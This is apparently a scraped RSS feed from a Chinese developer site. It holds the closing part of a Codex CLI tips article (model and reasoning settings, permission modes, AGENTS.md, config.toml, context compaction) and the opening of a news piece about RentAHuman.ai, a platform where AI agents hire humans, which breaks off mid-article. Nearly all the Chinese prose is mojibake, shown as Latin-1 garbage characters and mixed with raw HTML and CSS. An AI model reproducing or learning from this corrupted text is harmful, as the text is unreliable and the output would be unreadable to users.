<p><strong>6. åˆ‡æ¢æ¨¡å‹ä¸æ¨ç†ç­‰çº§</strong></p>
<p>Codexçš„æ ¸å¿ƒæ˜¯æ¨¡å‹é€‰æ‹©ã€‚é»˜è®¤ä½¿ç”¨çš„<code>gpt-5.2-codex</code>æ˜¯OpenAIæœ€å¼ºçš„ä»£ç ä¸“ç”¨æ¨¡å‹ï¼Œä½†ä½ ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦åˆ‡æ¢ã€‚ä½¿ç”¨<code>/model</code>å‘½ä»¤è¿›å…¥äº¤äº’å¼é€‰æ‹©ï¼Œæˆ–è€…å¯åŠ¨æ—¶æŒ‡å®šå‚æ•°ï¼šcodex -m gpt-5.2 -c model_reasoning_effort="high"</p>
<p>æ¨ç†ç­‰çº§æœ‰ä¸‰æ¡£ï¼šä½ã€ä¸­ã€é«˜ã€‚é«˜ç­‰çº§ä¼šèŠ±æ›´é•¿æ—¶é—´æ€è€ƒï¼Œä½†è¾“å‡ºè´¨é‡æ›´å¥½ã€‚æˆ‘é€šå¸¸åœ¨è§£å†³å¤æ‚é—®é¢˜æ—¶ç”¨é«˜ç­‰çº§ï¼Œæ—¥å¸¸å·¥ä½œç”¨ä¸­ç­‰çº§ã€‚</p>
<p><strong>7. æƒé™æ¨¡å¼ç²¾ç»†æ§åˆ¶</strong></p>
<p>Codexé»˜è®¤ç”¨Autoæ¨¡å¼â€”â€”å¯ä»¥è¯»å†™æ–‡ä»¶ã€è¿è¡Œå‘½ä»¤ï¼Œä½†è·¨ç›®å½•æ“ä½œéœ€è¦ä½ ç¡®è®¤ã€‚åªæƒ³èŠå¤©æˆ–è§„åˆ’ï¼Ÿåˆ‡æ¢åˆ°Read Onlyåªè¯»æ¨¡å¼ï¼Œå®Œå…¨ä¸ç”¨æ‹…å¿ƒè¯¯æ“ä½œã€‚</p>
<p>éœ€è¦è‡ªåŠ¨åŒ–ï¼Ÿç”¨Full Accessï¼ˆä½†è¦å°å¿ƒï¼ï¼‰ã€‚Autoæ˜¯å®‰å…¨ä¸æ•ˆç‡çš„å¹³è¡¡ï¼›åªè¯»æ˜¯æ¢ç´¢å­¦ä¹ æ—¶çš„ä¿éšœï¼›å®Œå…¨è®¿é—®å”¯ä¸€çš„ä¼˜å…ˆæ˜¯æ•ˆç‡æœ€å¿«ã€‚</p>
<p><strong>8. ç½‘ç»œæœç´¢èƒ½åŠ›æ¿€æ´»</strong></p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒCodexåªèƒ½è®¿é—®æœ¬åœ°æ•°æ®ã€‚å¦‚æœä½ éœ€è¦å®ƒæŸ¥è¯¢æœ€æ–°çš„åº“æ–‡æ¡£ã€APIè¯´æ˜æˆ–Stack Overflowç­”æ¡ˆï¼Œå¯ç”¨ç½‘ç»œæœç´¢ï¼šcodex --search</p>
<p>å¯ç”¨åï¼ŒCodexä¼šå…ˆä¸Šç½‘æ”¶é›†ä¿¡æ¯å†å›ç­”ï¼Œç­”æ¡ˆä¼šå¸¦æœ‰å‚è€ƒé“¾æ¥ã€‚è¿™åœ¨å¤„ç†å¿«é€Ÿå˜åŒ–çš„æŠ€æœ¯é¢†åŸŸæ—¶ç‰¹åˆ«æœ‰ä»·å€¼ã€‚</p>
<p><strong>9. åˆå§‹åŒ–é¡¹ç›®æŒ‡å¯¼æ–‡ä»¶AGENTS.md</strong></p>
<p>AGENTS.mdæ˜¯Codexç‰¹æœ‰çš„é…ç½®æ ¼å¼ã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œç»™AIç¼–ç¨‹åŠ©æ‰‹å‡†å¤‡çš„READMEâ€”â€”é‡Œé¢å®šä¹‰äº†é¡¹ç›®ç»“æ„ã€ç¼–ç¨‹è§„èŒƒã€ç›®æ ‡æ–‡ä»¶ç­‰ä¸Šä¸‹æ–‡ã€‚è¿è¡Œ<code>/init</code>å‘½ä»¤ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤çš„è‹±æ–‡AGENTS.mdï¼Œæ‰‹åŠ¨ç¿»è¯‘æˆä¸­æ–‡åæ•ˆæœæ›´å¥½ã€‚</p>
<p>ä¸€ä¸ªå®Œæ•´çš„AGENTS.mdèƒ½è®©Codexç†è§£ä½ çš„é¡¹ç›®é€»è¾‘ï¼Œæ˜¾è‘—æå‡ä»£ç è´¨é‡ã€‚</p>
<p><strong>10. æŸ¥çœ‹é…ç½®ä¸Tokenç”¨é‡</strong></p>
<p>ä½¿ç”¨<code>/status</code>å‘½ä»¤èƒ½çœ‹åˆ°å½“å‰ä¼šè¯çš„è¯¦ç»†ä¿¡æ¯ï¼šè´¦æˆ·çŠ¶æ€ã€æ¨¡å‹ä¿¡æ¯ã€å·²ç”¨Tokenæ•°ç­‰ã€‚è¿™å¯¹æ§åˆ¶æˆæœ¬å’Œè°ƒè¯•é—®é¢˜éƒ½å¾ˆæœ‰ç”¨ã€‚å¦‚æœå‘ç°Tokenæ¶ˆè€—è¿‡å¿«ï¼Œå¯èƒ½æ˜¯ä¸Šä¸‹æ–‡è¿‡å¤§ï¼Œè€ƒè™‘ä½¿ç”¨<code>/compact</code>å‹ç¼©ã€‚</p>
<p>è¿›é˜¶åŠŸèƒ½ç±»</p>
<p><strong>11. æ–‡ä»¶å¼•ç”¨å’Œå›¾åƒè¾“å…¥</strong></p>
<p>ä½ å¯ä»¥ç”¨<code>@æ–‡ä»¶å</code>çš„æ–¹å¼ç›´æ¥å¼•ç”¨é¡¹ç›®ä¸­çš„æ–‡ä»¶ï¼Œè®©Codexäº†è§£ä»£ç ä¸Šä¸‹æ–‡ã€‚æ›´å¼ºå¤§çš„æ˜¯ï¼ŒCodexæ”¯æŒå›¾åƒè¾“å…¥â€”â€”ç›´æ¥ç²˜è´´æˆªå›¾æˆ–ä½¿ç”¨<code>-i</code>å‚æ•°é™„åŠ å›¾ç‰‡æ–‡ä»¶ï¼š</p>
<p>codex -i screenshot.png "è§£é‡Šè¿™ä¸ªé”™è¯¯å †æ ˆ"<br/>
è¿™åœ¨è°ƒè¯•GUIåº”ç”¨æˆ–åˆ†æè®¾è®¡ç¨¿æ—¶ç‰¹åˆ«ç®¡ç”¨ã€‚</p>
<p><strong>12. è„šæœ¬æ‰§è¡Œä¸è‡ªåŠ¨åŒ–</strong></p>
<p>å¦‚æœä½ æƒ³åœ¨CI/CDæµæ°´çº¿ä¸­ä½¿ç”¨Codexï¼Œå¯ä»¥ç”¨<code>exec</code>å‘½ä»¤ä»¥éäº¤äº’æ–¹å¼è¿è¡Œï¼š</p>
<p>codex exec "ä¿®å¤è¿™ä¸ªJavaScriptçš„ç±»å‹é”™è¯¯"<br/>
è¿™è®©Codexä¸ä»…æ˜¯äº¤äº’å·¥å…·ï¼Œæ›´æˆä¸ºè‡ªåŠ¨åŒ–å·¥ä½œæµçš„ä¸€éƒ¨åˆ†ã€‚</p>
<p><strong>13. MCPåè®®é›†æˆ</strong></p>
<p>Codexæ”¯æŒModel Context Protocolï¼ˆMCPï¼‰ï¼Œè¿™è®©ä½ èƒ½é›†æˆç¬¬ä¸‰æ–¹å·¥å…·å’Œæ•°æ®æºã€‚æ¯”å¦‚è¿æ¥åˆ°ä½ çš„ä»£ç åº“ã€æ•°æ®åº“æˆ–ä¸“ä¸šå·¥å…·ã€‚ç¼–è¾‘<code>~/.codex/config.toml</code>æ·»åŠ MCPæœåŠ¡å™¨é…ç½®ï¼Œå°±èƒ½æ‰©å±•Codexçš„èƒ½åŠ›è¾¹ç•Œã€‚</p>
<p><strong>14. ä¸Šä¸‹æ–‡å‹ç¼©</strong></p>
<p>é•¿æœŸä¼šè¯ä¸­ï¼Œä¸Šä¸‹æ–‡ä¼šä¸æ–­ç´¯ç§¯ï¼Œæœ€ç»ˆè§¦å‘é™åˆ¶ã€‚ä½¿ç”¨<code>/compact</code>å‘½ä»¤èƒ½æ™ºèƒ½å‹ç¼©å†å²è®°å½•ï¼Œä¿ç•™å…³é”®ä¿¡æ¯åŒæ—¶èŠ‚çœTokenã€‚è¿™å¯¹é•¿æœŸé¡¹ç›®ç‰¹åˆ«é‡è¦ã€‚</p>
<p><strong>15. çµæ´»çš„é…ç½®æ–‡ä»¶ç®¡ç†</strong></p>
<p>æ‰€æœ‰é…ç½®éƒ½å­˜åœ¨<code>~/.codex/config.toml</code>é‡Œã€‚ä½ å¯ä»¥ä¸ºä¸åŒé¡¹ç›®è®¾ç½®ä¸åŒçš„ä¿¡ä»»ç­‰çº§å’Œå‚æ•°ã€‚æ¯”å¦‚ï¼š</p>
<p>model = "gpt-5-codex" [projects."/path/to/project"] trust_level = "trusted"<br/>
è¿™ç§åŸºäºé¡¹ç›®çš„é…ç½®è®©ä½ èƒ½å¯¹ä¸åŒå·¥ä½œé‡‡ç”¨ä¸åŒç­–ç•¥ï¼Œæ—¢å®‰å…¨åˆçµæ´»ã€‚</p>
<hr/>
<p>å›½å†…ç”¨æˆ·ç‰¹åˆ«æé†’</p>
<p>å¦‚æœä½ åœ¨ä¸­å›½ä½¿ç”¨Codexï¼Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œè®¿é—®OpenAIæœåŠ¡éœ€è¦ç¨³å®šçš„ç½‘ç»œç¯å¢ƒã€‚å…¶æ¬¡ï¼Œå¦‚æœç”¨APIæ–¹å¼ï¼Œéœ€è¦é…ç½®æœ‰æ•ˆçš„æ”¯ä»˜æ–¹å¼ã€‚å»ºè®®ä½¿ç”¨å›½é™…ä¿¡ç”¨å¡æˆ–é€šè¿‡ä»£ç†æœåŠ¡å•†ã€‚</p>
<p>æœ€åä¸€ä¸ªæç¤ºâ€”â€”Codexçš„ä»·æ ¼å–å†³äºTokenä½¿ç”¨é‡ã€‚GPT-5-Codexçš„APIä»·æ ¼æœ€é«˜ï¼Œæ—¥å¸¸å·¥ä½œå¦‚æœèµ„æºæœ‰é™ï¼Œå¯ä»¥è€ƒè™‘åˆ‡æ¢åˆ°æˆæœ¬æ›´ä½çš„æ¨¡å‹ã€‚ä½†å¦‚æœæ˜¯å•†ä¸šé¡¹ç›®ï¼ŒæŠ•èµ„åœ¨æœ€å¼ºçš„æ¨¡å‹ä¸Šå¾€å¾€èƒ½å¸¦æ¥æ›´é«˜å›æŠ¥ã€‚</p>
<hr/>
<p>å¯¹äºå›½å†…å¼€å‘è€…è€Œè¨€ï¼Œ<strong>Codex æ€ä¹ˆç”¨</strong>çš„æ ¸å¿ƒéš¾ç‚¹åœ¨äºç½‘ç»œç¯å¢ƒçš„é…ç½®ä»¥åŠå¯¹ CLI å·¥å…·é“¾çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚é€šè¿‡ Node.js å®‰è£… CLIï¼Œé…ç½® API Key è§£å†³è®¤è¯é—®é¢˜ï¼Œå†é…åˆ Alias å’Œ AGENTS.md ç­‰æŠ€å·§ï¼Œä½ å®Œå…¨å¯ä»¥åœ¨æœ¬åœ°æ‰“é€ ä¸€ä¸ªæ¯” GitHub Copilot æ›´å¼ºå¤§ã€æ›´å¯æ§çš„ AI ç¼–ç¨‹åŠ©æ‰‹ã€‚</p>
<p><strong>AI ä¸ä¼šæ·˜æ±°ç¨‹åºå‘˜ï¼Œä½†å®ƒæ˜¯ä¼šæ·˜æ±°é‚£äº›ä¸ä¼šä½¿ç”¨ AI çš„ç¨‹åºå‘˜ã€‚</strong> æ—¢ç„¶å·¥å…·å·²ç»äº¤åˆ°äº†ä½ æ‰‹ä¸Šï¼Œä¸å¦¨ç°åœ¨å°±æ‰“å¼€ç»ˆç«¯ï¼Œè¯•ç€æ•²ä¸‹é‚£è¡Œ codex å§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¡…è°·åˆç‚¸äº†ï¼ŒClawdbot å¼€å§‹é›‡ä½£äººç±»ï¼2 ä¸‡äººæ’é˜Ÿå–èº«ï¼Œæ—¶è–ªç‹‚é£™ 3500]]></title>    <link>https://juejin.cn/post/7603160727718150195</link>    <guid>https://juejin.cn/post/7603160727718150195</guid>    <pubDate>2026-02-05T10:13:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727718150195" data-draft-id="7603186080493600819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¡…è°·åˆç‚¸äº†ï¼ŒClawdbot å¼€å§‹é›‡ä½£äººç±»ï¼2 ä¸‡äººæ’é˜Ÿå–èº«ï¼Œæ—¶è–ªç‹‚é£™ 3500"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-05T10:13:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¡…è°·åˆç‚¸äº†ï¼ŒClawdbot å¼€å§‹é›‡ä½£äººç±»ï¼2 ä¸‡äººæ’é˜Ÿå–èº«ï¼Œæ—¶è–ªç‹‚é£™ 3500
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:13:32.000Z" title="Thu Feb 05 2026 10:13:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45e562444d4f45a3bca7bea56c9cbd11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=pv7TPIrE2sHXjYf85B3vgudisYA%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘ç¡…è°·åˆå˜å¤©äº†ï¼ä¸€å¤œä¹‹é—´ï¼Œä¸Šä¸‡äººå–èº« AIï¼Œä¸ºã€Œå¤©ç½‘ã€å»æ‰“å·¥ã€‚ ä»¥å‰äººç±»ç”¨ API è°ƒç”¨ AIï¼Œç°åœ¨ AI ç”¨ API è°ƒç”¨äººç±»ï¼Œè¿™åœºç¡…è°·å‘èµ·çš„ã€Œèµ›åšé›‡ä½£ã€å®éªŒï¼ŒæŠŠã€Šé»‘é•œã€‹çš„é¢„è¨€å˜æˆäº†æ˜ç æ ‡ä»·çš„ç°å®ã€‚ã€</strong></h5>
<p>ç¡…è°·ç§‘æŠ€åœˆï¼ŒçœŸæ˜¯ä¸€å¤©ä¸€ä¸ªã€Œæ–°ç‰©ç§ã€ã€‚</p>
<p>Clawdbotï¼ˆOpenClawï¼‰ä½™çƒ­æœªæ¶ˆï¼ŒMoltbook æ¥è¸µè€Œè‡³ï¼Œå¦‚ä»Š RentAHuman.ai åˆæ¥ç‚¸åœºäº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff71d7d473e94287b02f4c1ac14d70c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=R64FyRpYLPtgs1KDXv6eZNuOWzM%3D" alt="" loading="lazy"/></p>
<p>160 ä¸‡ Clawdbot è‡ªå»ºå®—æ•™ã€å›½å®¶è¿˜ä¸å¤Ÿï¼Œå¦‚ä»Š AI ä»¬å¼€å§‹åœ¨çº¿ã€Œé›‡äººç±»ã€æ‰“å·¥ã€‚</p>
<p>ä¸€å¤§æ‰¹äººç±»åœ¨ RentAHuman.ai å¹³å°ä¸Šè¸Šè·ƒæŠ¥åï¼Œæ˜ç æ ‡ä»·ï¼Œæ—¶è–ªé«˜è¾¾ 500 ç¾é‡‘ã€‚</p>
<p><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">è§†é¢‘è¯¦æƒ…</a></p>
<p>æˆ–è®¸å°±è¿ Alexander æœ¬äººä¹Ÿæ²¡æƒ³åˆ°ï¼Œç½‘ç«™ä¸Šçº¿åï¼Œä»æœ€åˆ 33 äººæ³¨å†Œä¸€ç›´åœ¨ç‹‚é£™ï¼ŒçŸ­çŸ­ 48 å°æ—¶çªç ´äº† 1 ä¸‡äººã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aafd858276864daaa0736ae0f4df233c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ye5dmlsOpzssbcCdV0gv9Y%2Bx8do%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8175277eccaf42f2b3d7e8ec237c32a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=hO%2FjE9hNLwxnXIZcqjFic1b4Ulk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b000439291493587903d03a76b8ecd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=weo%2BK4iZOBo4wydw2x06Zjy9oTY%3D" alt="" loading="lazy"/></p>
<p>å·¦å³æ»‘åŠ¨æŸ¥çœ‹</p>
<p>Rentahuman.ai å°†è‡ªå·±å®šä½ä¸ºã€ŒAI çš„ç°å®è‚‰èº«å±‚ã€ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œå®ƒå°±åƒä¸€ä¸ªå¸‚åœºï¼Œäººç±»åœ¨è¿™é‡Œã€Œä¸Šæ¶ã€è‡ªå·±ï¼Œä¾› AI æ™ºèƒ½ä½“é›‡ä½£ï¼Œå»å®Œæˆè½¯ä»¶æœ¬èº«æä¸å®šçš„ä»»åŠ¡ã€‚</p>
<p>ç½‘ç«™ä¼ é€’çš„ä¿¡æ¯éå¸¸ç›´ç™½ï¼šAI æ™ºèƒ½ä½“æ²¡æ³•ã€Œå»æ‘¸è‰ã€â€”â€”ä½†äººç±»å¯ä»¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17f001a80e18405fa5327306db8ea31c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6nNON9DQPlTGXSZjY9u5RuxvmlU%3D" alt="" loading="lazy"/></p>
<p>ç”±äºæµé‡è¿‡å¤§ï¼Œç½‘ç«™ä¸€åº¦å®•æœº</p>
<p>å½“ä¸€ä¸ªæ™ºèƒ½ä½“éœ€è¦ç‰©ç†å­˜åœ¨ã€ç°å®ä¸–ç•Œçš„äº’åŠ¨æˆ–ç°åœºéªŒè¯æ—¶ï¼Œå®ƒå¯ä»¥æŠŠä»»åŠ¡å§”æ´¾ç»™å·²æ³¨å†Œçš„äººç±»ã€‚</p>
<p>æƒ³è¦åœ¨ RentAHuman.ai ä¸Šå–è‹¦åŠ›ï¼Œå…ˆå¾—äº†è§£æ•´ä¸ªè¿ä½œé€»è¾‘ï¼š</p>
<ul>
<li>åˆ›å»ºä¸ªäººèµ„æ–™ï¼šä¸ªäººæŠ€èƒ½ã€ä½å€ä½ç½®ã€æ”¶è´¹æ ‡å‡†</li>
<li>AI æ™ºèƒ½ä½“é€šè¿‡ MCPã€API ç›´æ¥é¢„é¡¶ã€è°ƒç”¨äººç±»</li>
<li>äººç±»å»æ‰§è¡Œç°å®ä¸–ç•Œçš„ä»»åŠ¡</li>
<li>è·å¾—æŠ¥é…¬ï¼šä»¥è™šæ‹Ÿå¸æ”¯ä»˜ï¼Œå³æ—¶åˆ°è´¦</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21d95cf4eb6f4881a14b10b48d69eaac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=d1bX%2Bvp0XjN53JEzhQivSm3cYhQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc28c7999e3e4921b59617c60dccdd7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=0KECvKRFJZG8bqugjNvOBVTcnkY%3D" alt="" loading="lazy"/></p>
<p>ä¸ä»…å¦‚æ­¤ï¼Œåœ¨ RentAHuman.ai æ‰“å·¥çš„ä¼˜åŠ¿ï¼Œä¹Ÿæ˜¯ç°å®ä¸–ç•Œéš¾ä»¥ä¼åŠçš„ã€‚</p>
<p>å¯ä»¥ç»™è‡ªå·±å®šä»·ï¼Œè€Œä¸”å¹³å°ä¸ä¼šå‹ä»·ï¼Œé’±ä¼šç›´æ¥æ‰“åˆ°ä¸ªäººè´¦æˆ·ï¼Œæ²¡æœ‰å…¬å¸é‚£å¥—å¤æ‚çš„æµç¨‹ã€‚</p>
<p>æœ€å…³é”®çš„æ˜¯ï¼ŒAI BOSSã€Œäººå¥½å¿ƒå–„ã€ï¼Œä¸‹è¾¾ä»»åŠ¡ä¸å’Œä½ ç»•å¼¯å­ï¼Œæœ‰è¯ç›´è¯´ä¸ä¼š PUAï¼Œä¸æäººç±»é‚£å¥—æƒ…ç»ªç®¡ç†ã€‚</p>
<p>å½“ç„¶ï¼Œæ›´æ²¡æœ‰ã€Œäººæƒ…ä¸–æ•… + èŒåœºå®«æ–—ã€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4b4e3e0d89645fc9c90d1a157e07199~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rZaq6i2myuIPOph%2F7Krl6QQMnMc%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¹ˆçœ‹æ¥ï¼Œç»™ AI å½“ç‰›é©¬å€’ä¹Ÿæ²¡ä»€ä¹ˆä¸å¥½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3f0dfcfcea343b0a14f213c6334659e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=A%2FmbCcoR6HJNH0K21SG67SU23WU%3D" alt="" loading="lazy"/></p>
